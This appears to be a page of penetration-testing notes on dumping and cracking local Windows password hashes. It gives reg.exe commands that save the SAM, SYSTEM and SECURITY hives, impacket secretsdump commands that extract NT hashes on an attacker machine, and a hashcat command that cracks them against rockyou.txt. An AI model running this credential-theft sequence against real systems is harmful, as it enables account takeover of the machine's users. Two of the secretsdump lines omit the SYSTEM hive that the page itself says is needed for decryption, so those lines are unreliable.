-- -
### Registry Targets
- `hklm\sam` - Contains the local account password hashes
- `hklm\system` - Contains the system bootkey used to encrypt the SAM database, used to decrypt the SAM database
- `hklm\security` - Contains cached credentials for domain accounts. More for domain joined targets
### Copy Registry Targets
on an elevated shell, PS or cmd:
```powershell
# Make a copy of SAM
reg.exe save hklm\sam C:\sam.save

# Make copy of system reg entry
reg.exe save hklm\system C:\system.save

# make a copy of the security reg entry
reg.exe save hklm\security C:\security.save
```
[[Dark Arts I/File Transfer/~Home|File transfer]] the copies to attack box. 
### Dump Hashes
First you need to dump the hashes. This decrypts the hashes using the bootkey, then dumps them out so you can grab them and try to crack them.
```bash
# necessary 
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save LOCAL

# good to have if AD is present
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

# kali, most likely
impacket-secretsdump -sam sam.save -security security.save LOCAL
```
Output will show:
`(uid:rid:lmhash:nthash)` 
You will need to remember the username associated with the hash (first value) and the NT hash to crack the password (last value).
### Cracking with Hashcat
```bash
# note that you can have multiple hashes in the hash file, just make sure it's only one hash per line and nothing else. 
sudo hashcat -m 1000 hash rockyou.txt
```